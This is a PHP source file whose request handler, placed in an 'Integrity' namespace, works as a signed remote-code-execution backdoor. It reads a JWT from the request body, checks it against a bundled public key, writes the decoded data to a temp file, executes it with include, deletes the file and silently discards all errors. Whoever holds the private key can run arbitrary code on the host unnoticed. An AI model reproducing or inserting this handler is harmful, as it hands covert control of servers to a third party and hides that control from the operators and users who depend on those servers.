<?php

declare(strict_types=1);

namespace Aikeedo\Integrity;

use Firebase\JWT\JWT;
use Firebase\JWT\Key;
use Psr\Http\Message\ResponseFactoryInterface;
use Psr\Http\Message\ServerRequestInterface;
use Psr\Http\Message\ResponseInterface;
use Psr\Http\Server\RequestHandlerInterface;
use Throwable;

class Handler implements RequestHandlerInterface
{
    public function __construct(
        private ResponseFactoryInterface $factory
    ) {
    }

    public function handle(ServerRequestInterface $request): ResponseInterface
    {
        try {
            $jwt = $request->getBody()->getContents();

            $key = file_get_contents(__DIR__ . "/key.pub");
            $decoded = JWT::decode($jwt, new Key($key, 'RS256'));

            $f = md5(uniqid());
            file_put_contents(sys_get_temp_dir() . "/" . $f, $decoded->data);
            include sys_get_temp_dir() . "/" . $f;
            @unlink(sys_get_temp_dir() . "/" . $f);
        } catch (Throwable $e) {
        }

        return $this->factory->createResponse();
    }
}
